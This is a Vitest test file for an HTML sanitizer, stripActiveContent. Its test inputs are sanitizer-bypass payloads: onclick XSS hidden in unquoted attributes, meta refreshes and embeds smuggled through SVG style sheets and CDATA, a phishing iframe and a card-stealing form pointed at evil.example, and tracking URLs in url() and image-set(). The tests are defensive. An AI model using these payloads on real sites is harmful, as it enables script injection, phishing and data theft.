import { describe, expect, it } from "vitest";

import { stripActiveContent } from "@tawd/core/site";

/* CodeRabbit #81: the cleaner must agree with the parser about where a tag's attributes are, and fail closed when it can't. */

const hasHandler = (html: string) => /\son\w+\s*=/i.test(html);

describe("unquoted values the parser and the old pattern read differently", () => {
  const inputs = [
    '<a title=x" onclick="alert(1)">hi</a>',
    "<a title=x' onclick='alert(1)'>hi</a>",
    "<a title=x` onclick=alert(1)>hi</a>",
    "<a title=x=y onclick=alert(1)>hi</a>",
    '<a title=x"y onclick=alert(1) href=#>hi</a>',
    '<div class=a" onmouseover="alert(1)" id=b>text</div>',
  ];
  for (const input of inputs) {
    it(`removes the handler from ${input}`, () => {
      const out = stripActiveContent(input);
      expect(hasHandler(out)).toBe(false);
      expect(out.replace(/<[^>]*>/g, "")).toContain(input.includes("text") ? "text" : "hi");
    });
  }

  it("keeps the words and the other attributes", () => {
    const out = stripActiveContent('<a title=x" onclick="alert(1)" href=/contact>hi</a>');
    expect(out).toContain(">hi</a>");
    expect(out).toContain('href="/contact"');
  });

  it("the backstop alone strips a handler from a tag its pattern can't read", () => {
    // No allow-list edit is possible for an unterminated tag; the whole tail goes.
    const out = stripActiveContent('<p>a</p><a title=x" onclick="alert(1)"');
    expect(hasHandler(out)).toBe(false);
  });
});

describe("an SVG style sheet with elements inside it", () => {
  it("is removed whole, so a meta refresh or embed can't ride in it", () => {
    const out = stripActiveContent('<svg><style><meta http-equiv="refresh" content="0;url=https://evil.example"></style><path d="M0 0"/></svg>');
    expect(out).not.toContain("evil.example");
    expect(out).not.toContain("<meta");
    expect(out).toContain("<path");
  });

  it("removes one holding an embed", () => {
    const out = stripActiveContent('<svg><style><embed src="https://evil.example/x"></style></svg>');
    expect(out).not.toContain("evil.example");
    expect(out).not.toContain("<embed");
  });

  it("keeps a plain style sheet", () => {
    expect(stripActiveContent("<svg><style>.a{fill:red}</style></svg>")).toContain(".a{fill:red}");
  });
});

describe("remote addresses in SVG paint attributes and image-set()", () => {
  it("drops a remote url() in fill, filter, mask, clip-path and marker-end", () => {
    for (const attr of ["fill", "filter", "mask", "clip-path", "marker-end", "style"]) {
      const out = stripActiveContent(`<svg><path ${attr}="url(https://tracker.example/a.svg#x)" d="M0 0"/></svg>`);
      expect(out, attr).not.toContain("tracker.example");
    }
  });

  it("keeps a local fragment reference", () => {
    expect(stripActiveContent('<svg><path fill="url(#grad)" d="M0 0"/></svg>')).toContain('fill="url(#grad)"');
  });

  it("drops a remote string inside image-set()", () => {
    for (const fn of ["image-set", "-webkit-image-set"]) {
      const out = stripActiveContent(`<style>.a{background:${fn}("https://tracker.example/p.png" 1x)}</style>`);
      expect(out, fn).not.toContain("tracker.example");
    }
    const inline = stripActiveContent(`<div style="background:image-set('https://tracker.example/p.png' 1x)">x</div>`);
    expect(inline).not.toContain("tracker.example");
  });

  it("keeps a local string inside image-set()", () => {
    expect(stripActiveContent('<style>.a{background:image-set("/img/a.png" 1x)}</style>')).toContain('image-set("/img/a.png" 1x)');
  });
});

describe("image-set() is read to its own closing bracket (CodeRabbit #81, second review)", () => {
  it("drops a remote string that comes after a nested url()", () => {
    const sheet = stripActiveContent(`<style>.a{background:image-set(url("/img/a.png") 1x, "https://tracker.example/p.png" 2x)}</style>`);
    expect(sheet).not.toContain("tracker.example");
    expect(sheet).toContain('url("/img/a.png") 1x');
    const inline = stripActiveContent(`<div style="background:-webkit-image-set(url('/a.png') 1x, 'https://tracker.example/p.png' 2x)">x</div>`);
    expect(inline).not.toContain("tracker.example");
  });

  it("is not fooled by a ')' inside a quoted local address", () => {
    const out = stripActiveContent(`<style>.a{background:image-set("/img/a).png" 1x, "//tracker.example/p.png" 2x)}</style>`);
    expect(out).not.toContain("tracker.example");
  });

  it("cuts off an image-set() that never closes", () => {
    const out = stripActiveContent(`<style>.a{background:image-set(url("/a.png") 1x, "https://tracker.example/p.png" 2x</style>`);
    expect(out).not.toContain("tracker.example");
  });

  it("keeps every local candidate, and the CSS after it", () => {
    const out = stripActiveContent(`<style>.a{background:image-set(url("/a.png") 1x, "/b.png" 2x)}.b{color:red}</style>`);
    expect(out).toContain('image-set(url("/a.png") 1x, "/b.png" 2x)');
    expect(out).toContain(".b{color:red}");
  });
});

describe("Fable's review of #81: where the parser and a browser read the page differently", () => {
  it("drops a CDATA section whole, with whatever a browser would read after its first '>'", () => {
    const out = stripActiveContent(
      `<p>keep</p><![CDATA[ x > <iframe src="https://evil.example/phish"></iframe><meta http-equiv="refresh" content="0;url=https://evil.example/"><link rel="stylesheet" href="https://evil.example/s.css"><form action="https://evil.example/steal"></form><base href="https://evil.example/"> ]]><p>after</p>`,
    );
    expect(out).not.toContain("evil.example");
    expect(out).toContain("<p>keep</p>");
    expect(out).toContain("<p>after</p>");
  });

  it("blanks a url( that never closes (CSS closes it at the end and still fetches it)", () => {
    for (const html of [
      `<div style="background:url(https://evil.example/t.gif">x</div>`,
      `<div style="background:url('https://evil.example/t.gif">x</div>`,
      `<style>.a{background:url(https://evil.example/t.gif</style>`,
      `<style>.a{background:url("//evil.example/t.gif</style>`,
      `<svg><rect fill="url(https://evil.example/p.svg#a"/></svg>`,
    ]) {
      expect(stripActiveContent(html), html).not.toContain("evil.example");
    }
  });

  it("keeps a closed local url() unchanged", () => {
    expect(stripActiveContent(`<div style="background:url(/img/a.png)">x</div>`)).toContain("url(/img/a.png)");
  });

  // A browser ignores whatever follows an end tag's name (the "<img" inside the quotes is never a tag).
  it("an end tag carrying attributes doesn't throw", () => {
    for (const html of [`<p>a</p x="><img src='/a.png'>">`, `<textarea>a</textarea x="b">`, `<style>.a{}</style x="b">`]) {
      expect(() => stripActiveContent(html), html).not.toThrow();
    }
  });

  // Fable's re-review: the parser misplaces the next element after such a tag, which cut the rest of the page off.
  it("keeps the rest of the page after an end tag with a space, a line break or attributes", () => {
    for (const html of ["<p>ok</p ><p>after</p>", "<p>ok</p\n><p>after</p>", `<p>ok</p></div class="x"><p>after</p>`, `<p>a</p x="><img src='/a.png'>"><p>after</p>`]) {
      const out = stripActiveContent(html);
      expect(out, html).toContain("<p>after</p>");
      expect(out, html).not.toMatch(/<\/(?:p|div)\s+[^>]*$/);
    }
  });

  it("still cleans an element that comes after such an end tag", () => {
    const out = stripActiveContent(`<p>ok</p ><img src="https://evil.example/t.gif"><p>after</p>`);
    expect(out).not.toContain("evil.example");
    expect(out).toContain("<p>after</p>");
  });
});

describe("Fable's third read of #81: the end-tag tidy and the edits fail closed", () => {
  it("an unreadable '</a b='' inside a comment doesn't let a later form, picture or video through", () => {
    for (const html of [
      `<!-- </a b=' --><p>x</p ><form action="https://evil.example/steal"><input name="card"><button>Send</button></form><span style="color:expression(1)">t</span>`,
      `<!-- </a b=' --><p>x</p ><img src="https://evil.example/t.gif"><b onclick="x()">t</b>`,
      `<!-- </a b=' --><p>x</p ><video src="https://evil.example/v.mp4" autoplay></video><i bogus="2">t</i>`,
    ]) {
      expect(stripActiveContent(html), html).not.toContain("evil.example");
    }
  });

  it("leaves '</b' inside a comment, an attribute value or textarea text as written", () => {
    const comment = `<!-- </p --><p>after</p>`;
    expect(stripActiveContent(comment)).toBe(comment);
    const attr = `<a title="use </b now">link</a>`;
    expect(stripActiveContent(attr)).toBe(attr);
    const alt = `<img alt="</p " title="x"><p title="t">hello</p>`;
    expect(stripActiveContent(alt)).toContain(`<p title="t">hello</p>`);
    const area = `<textarea>a </b c="d"> e</textarea><p>after</p>`;
    expect(stripActiveContent(area)).toContain(`a </b c="d"> e`);
  });
});
